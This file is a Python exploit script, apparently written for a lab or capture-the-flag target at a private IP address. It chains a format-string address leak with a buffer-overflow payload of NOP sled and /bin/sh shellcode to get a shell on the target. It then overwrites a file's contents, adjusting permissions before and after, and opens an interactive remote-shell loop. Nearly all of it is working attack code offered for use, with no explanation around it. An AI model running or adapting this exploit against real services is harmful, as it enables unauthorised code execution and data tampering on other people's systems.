import socket
from binascii import a2b_hex

host = '192.168.56.102'
port = 5000

# the base_payload comes from the .pcap file
base_payload = [0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
                0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
                0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
                0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0xEB, 0x71, 0x5D, 0x31,
                0xC0, 0x31, 0xDB, 0x31, 0xC9, 0x31, 0xD2, 0x31, 0xFF, 0x31, 0xF6, 0xB0, 0x22, 0x89, 0xC6, 0xB0, 0xC0,
                0xB1, 0x01, 0x66, 0xC1, 0xE1, 0x0C, 0xB2, 0x03, 0x4F, 0xCD, 0x80, 0x89, 0xC1, 0x31, 0xFF, 0xB3, 0x02,
                0x89, 0xCA, 0x80, 0xC1, 0x04, 0x31, 0xC0, 0x66, 0xB8, 0x70, 0x01, 0xFE, 0xC3, 0xC6, 0x02, 0x10, 0x89,
                0x39, 0xCD, 0x80, 0x39, 0xF8, 0x75, 0xED, 0x8B, 0x01, 0x3C, 0x02, 0x75, 0xE7, 0x89, 0xCA, 0x31, 0xC9,
                0x31, 0xC0, 0xB0, 0x3F, 0xCD, 0x80, 0x41, 0xB0, 0x3F, 0xCD, 0x80, 0x41, 0xB0, 0x3F, 0xCD, 0x80, 0x31,
                0xC0, 0x89, 0x6D, 0x08, 0x89, 0x45, 0x0C, 0x88, 0x45, 0x07, 0xB0, 0x0B, 0x89, 0xEB, 0x8D, 0x4D, 0x08,
                0x8D, 0x55, 0x0C, 0xCD, 0x80, 0xB0, 0x01, 0xCD, 0x80, 0xE8, 0x8A, 0xFF, 0xFF, 0xFF, 0x2F, 0x62, 0x69,
                0x6E, 0x2F, 0x73, 0x68, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41, 0x41]+[0x0A, 0x00, 0x00, 0x00]+\
               [0x0D,0x00, 0x00, 0x00]+[0x00, 0x91, 0x98, 0xC3, 0xFF, 0x0a]

echo = b'ECHO %x%x%x%x %x\n'

# initialize the socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

# send the ECHO command
s.send(echo)
address = s.recv(4096)
print("Output from ECHO: ", address)
address = address.split()[-1]
address = a2b_hex(address)[::-1] # reverse
address_lower_byte = (address[0] + 0xF6) % 256  # obtain lower byte

i = [0x0A, 0x00, 0x00, 0x00]
len = [0x0C, 0x00, 0x00, 0x00]
payload = base_payload[:200] + i + len +[address_lower_byte]
payload.extend(address)
payload = bytes(payload)
print("Sending the payload: ", payload[50:])

s.send(payload)

# testing the shell
s.send(b'uname\n')
out = s.recv(4096)
print("Output from uname: ", out.decode())

s.send(b'chmod u+w A9826\n')
out = s.recv(4096)
print("Output from instruction: ", out.decode())

s.send(b'echo 1000000 > A9826\n')
out = s.recv(4096)
print("Output from instruction: ", out.decode())

s.send(b'chmod u-w A9826\n')
out = s.recv(4096)
print("Output from instruction: ", out.decode())

s.send(b'exit\n')
out = s.recv(4096)
print("Output from instruction: ", out.decode())

# if the shell is open, we can execute whatever we want
while True:
    user_in = input("$ ")
    if user_in == "exit":
        s.send(b'exit\n')
        break
    s.send(str.encode(user_in + '\n'))
    out = s.recv(1024)
    print(" %r" % out)

s.close()
